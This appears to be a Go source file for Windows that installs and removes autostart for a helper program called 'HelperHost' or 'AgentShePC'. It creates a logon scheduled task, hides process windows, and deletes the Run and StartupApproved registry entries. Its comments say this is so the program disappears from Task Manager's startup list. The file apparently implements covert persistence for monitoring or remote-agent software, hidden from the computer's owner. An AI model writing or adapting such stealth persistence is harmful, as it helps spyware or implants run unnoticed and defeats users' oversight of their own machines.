//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func hideWindow(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}

func clearStartupApproved(name string) {
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`,
		registry.SET_VALUE,
	)
	if err == nil {
		_ = key.DeleteValue(name)
		_ = key.Close()
	}
}

func installAutostart() string {
	// Watchdog via scheduled task only — HKCU\Run appears in Task Manager "Startup apps".
	tr := fmt.Sprintf("\"%s\" --watch", helperPath)
	_ = exec.Command("schtasks", "/Delete", "/TN", "HelperHost", "/F").Run()
	// Remove legacy Run entry + StartupApproved so the line disappears from demarrage.
	if key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE); err == nil {
		_ = key.DeleteValue("HelperHost")
		_ = key.DeleteValue("AgentShePC")
		_ = key.Close()
	}
	clearStartupApproved("HelperHost")
	clearStartupApproved("AgentShePC")

	r := exec.Command("schtasks", "/Create", "/TN", "HelperHost", "/TR", tr, "/SC", "ONLOGON", "/DELAY", "0001:00", "/RL", "LIMITED", "/F")
	if r.Run() == nil {
		return "task"
	}
	return "ok"
}

func removeAutostart() {
	for _, tn := range []string{
		"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot",
		"HelperHostWipeRestore", "AgentShePC",
	} {
		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		_ = key.DeleteValue("HelperHost")
		_ = key.DeleteValue("AgentShePC")
		_ = key.Close()
	}
	clearStartupApproved("HelperHost")
	clearStartupApproved("AgentShePC")
}
